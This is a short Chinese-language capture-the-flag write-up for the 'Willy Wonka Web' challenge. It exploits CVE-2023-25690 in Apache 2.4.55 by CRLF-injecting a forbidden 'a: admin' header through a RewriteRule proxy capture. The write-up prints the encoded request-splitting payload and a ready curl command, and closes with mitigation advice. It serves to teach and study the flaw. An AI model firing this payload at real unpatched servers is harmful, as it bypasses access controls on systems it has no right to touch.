# Willy Wonka Web

## 题目简述

前端为 Apache HTTP Server 2.4.55，配置把 `/name/(.*)` 通过 `RewriteRule ... [P]` 代理到 Node.js 后端的 `/?name=$1`，并显式删除请求头 `A`/`a`。后端只有在收到值为 `admin` 的 `a` 头时返回 flag。

Apache 版本受 CVE-2023-25690 影响：用户可控的 RewriteRule 捕获组未安全转义就进入代理请求，能够通过路径中的 CRLF 注入后端请求行和请求头。

## 解题过程

构造路径：

```text
/name/a%20HTTP/1.1%0d%0aa:%20admin%0d%0aX-Bad:
```

URL 解码后的捕获内容近似为：

```http
a HTTP/1.1
a: admin
X-Bad:
```

Apache 在正常请求头处理阶段确实删除了外部 `a` 头，但恶意头是在 RewriteRule 拼装代理请求时才被注入，因此绕过该过滤。`X-Bad:` 吸收代理模板中剩余的内容，使后端最终解析到独立的 `a: admin`。

请求可直接发送为：

```bash
curl 'https://TARGET/name/a%20HTTP/1.1%0d%0aa:%20admin%0d%0aX-Bad:'
```

Node.js 的 `req.header('a')` 返回 `admin`，响应为：

```text
byuctf{i_never_liked_w1lly_wonka}
```

## 方法总结

- 核心技巧：利用 Apache RewriteRule 代理目标中的 CRLF 注入，在前端过滤完成后向后端补入受保护请求头。
- 识别信号：旧版 Apache、用户路径捕获组直接插入 `[P]` 代理 URL、前后端对请求边界解析不一致时，应检查 CVE-2023-25690 类请求拆分问题。
- 复用要点：升级受影响版本，并避免把未经严格转义的捕获内容写入代理目标；不能把前端删头当成后端身份认证。
